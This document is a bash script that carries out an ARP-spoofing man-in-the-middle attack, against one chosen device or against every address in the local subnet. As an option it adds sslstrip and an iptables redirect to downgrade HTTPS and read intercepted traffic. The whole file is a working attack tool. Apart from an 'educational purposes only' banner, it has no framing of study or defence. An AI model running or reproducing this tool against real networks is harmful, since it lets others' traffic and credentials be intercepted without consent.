#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'        # Normal Yellow
YELLOW_BRIGHT='\033[1;33m' # Bright Yellow
NC='\033[0m' # No Color

# Display a warning message in bright yellow
echo -e "${YELLOW_BRIGHT}***************************************************************************${NC}"
echo -e "${YELLOW_BRIGHT}*                                                                         *${NC}"
echo -e "${YELLOW_BRIGHT}*   WARNING: This script is for educational purposes only.                *${NC}"
echo -e "${YELLOW_BRIGHT}*   Unauthorized use is illegal and may result in severe consequences.    *${NC}"
echo -e "${YELLOW_BRIGHT}*                                                                         *${NC}"
echo -e "${YELLOW_BRIGHT}***************************************************************************${NC}"

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}This script must be run as root. Please use sudo.${NC}"
    exit 1
fi

# Enable IP forwarding
echo -e "${YELLOW}Enabling IP forwarding...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward

# Function to handle cleanup on CTRL+C
function cleanup() {
    echo -e "${RED}\nAttack stopped. Cleaning up...${NC}"
    echo 0 > /proc/sys/net/ipv4/ip_forward
    pkill arpspoof
    pkill sslstrip
    iptables -t nat -F
    exit 0
}

# Trap CTRL+C to call cleanup
trap cleanup SIGINT

# Detect the router IP automatically
router=$(ip route | grep default | awk '{print $3}')

# Check if the router was detected
if [[ -z "$router" ]]; then
    echo -e "${RED}Failed to detect the router IP. Please ensure you are connected to a network.${NC}"
    exit 1
fi

# Function to list and select network interfaces
function select_interface() {
    while true; do
        interfaces=$(ip link show | grep -E "^[0-9]+:" | awk -F': ' '{print $2}')
        echo -e "${YELLOW}Available network interfaces:${NC}"
        i=1
        for iface in $interfaces; do
            echo "$i) $iface"
            iface_list[$i]=$iface
            ((i++))
        done

        read -p "Enter the number corresponding to your network interface: " iface_choice
        selected_iface=${iface_list[$iface_choice]}
        if [[ -n "$selected_iface" ]]; then
            echo -e "${GREEN}Selected interface: $selected_iface${NC}"
            break
        else
            echo -e "${RED}Invalid choice. Please try again.${NC}"
        fi
    done
}

# Call the function to select interface
select_interface

# Function to perform the attack on a single target
function attack_single() {
    while true; do
        read -p "Enter the target device's IP: " target
        if [[ -n "$target" ]]; then
            echo -e "${GREEN}Preparing to attack device $target...${NC}"
            break
        else
            echo -e "${RED}Invalid input. Please enter a valid IP address.${NC}"
        fi
    done

    # Ask about sslstrip usage
    echo -e "${YELLOW}SSLStrip Option:${NC}"
    echo -e "SSLStrip downgrades HTTPS connections to HTTP, allowing you to intercept and read secure traffic."

    while true; do
        read -p "Do you want to use sslstrip? (yes/y or no/n): " use_sslstrip
        if [[ "$use_sslstrip" =~ ^(yes|y)$ ]]; then
            echo -e "${YELLOW}Starting sslstrip...${NC}"
            sslstrip -l 8080 &
            echo -e "${YELLOW}Configuring iptables to redirect HTTP traffic...${NC}"
            iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
            echo -e "${GREEN}sslstrip is running. HTTPS traffic will be downgraded to HTTP.${NC}"
            break
        elif [[ "$use_sslstrip" =~ ^(no|n)$ ]]; then
            echo -e "${GREEN}sslstrip will not be used.${NC}"
            break
        else
            echo -e "${RED}Invalid input. Please answer with 'yes/y' or 'no/n'. Try again.${NC}"
        fi
    done

    echo -e "${GREEN}Starting attack on device $target...${NC}"
    echo -e "${RED}To stop the attack, press CTRL+C.${NC}"
    sudo arpspoof -i $selected_iface -t $target $router &
    sudo arpspoof -i $selected_iface -t $router $target &
    wait
}

# Function to perform the attack on the entire network
function attack_all() {
    # Detect the network range and mask
    network_info=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
    network=$(echo $network_info | cut -d'/' -f1)
    cidr=$(echo $network_info | cut -d'/' -f2)

    # Calculate the IP range based on CIDR
    IFS=. read -r i1 i2 i3 i4 <<< "${network}"
    case $cidr in
        24)
            start_ip="${i1}.${i2}.${i3}.1"
            end_ip="${i1}.${i2}.${i3}.254"
            ;;
        16)
            start_ip="${i1}.${i2}.0.1"
            end_ip="${i1}.${i2}.255.254"
            ;;
        12)
            start_ip="${i1}.${i2}.0.1"
            end_ip="${i1}.${i2}.15.254"
            ;;
        *)
            echo -e "${RED}Unsupported CIDR length: /$cidr${NC}"
            exit 1
            ;;
    esac

    echo -e "${GREEN}Preparing to attack the network range: $start_ip - $end_ip (${network_info})...${NC}"

    # Ask about sslstrip usage
    echo -e "${YELLOW}SSLStrip Option:${NC}"
    echo -e "SSLStrip downgrades HTTPS connections to HTTP, allowing you to intercept and read secure traffic."

    while true; do
        read -p "Do you want to use sslstrip? (yes/y or no/n): " use_sslstrip
        if [[ "$use_sslstrip" =~ ^(yes|y)$ ]]; then
            echo -e "${YELLOW}Starting sslstrip...${NC}"
            sslstrip -l 8080 &
            echo -e "${YELLOW}Configuring iptables to redirect HTTP traffic...${NC}"
            iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
            echo -e "${GREEN}sslstrip is running. HTTPS traffic will be downgraded to HTTP.${NC}"
            break
        elif [[ "$use_sslstrip" =~ ^(no|n)$ ]]; then
            echo -e "${GREEN}sslstrip will not be used.${NC}"
            break
        else
            echo -e "${RED}Invalid input. Please answer with 'yes/y' or 'no/n'. Try again.${NC}"
        fi
    done

    echo -e "${GREEN}Starting attack on the network range: $start_ip - $end_ip (${network_info})...${NC}"
    echo -e "${RED}To stop the attack, press CTRL+C.${NC}"

    # Perform the attack for each IP in the range
    for ip in $(seq 1 254); do
        target_ip="${i1}.${i2}.${i3}.${ip}"
        sudo arpspoof -i $selected_iface -t $target_ip $router &
        sudo arpspoof -i $selected_iface -t $router $target_ip &
        sleep 0.2  # Add a small delay to reduce load on the system
    done
    wait
}

# Display the detected router
echo -e "${GREEN}Router detected: $router${NC}"

# Ask the user for the attack type
while true; do
    echo "Select the type of attack:"
    echo "1) Single Device"
    echo "2) Entire Network"
    read -p "Enter your choice (1/2): " choice
    if [[ "$choice" == "1" ]]; then
        attack_single
        break
    elif [[ "$choice" == "2" ]]; then
        attack_all
        break
    else
        echo -e "${RED}Invalid choice. Please try again.${NC}"
    fi
done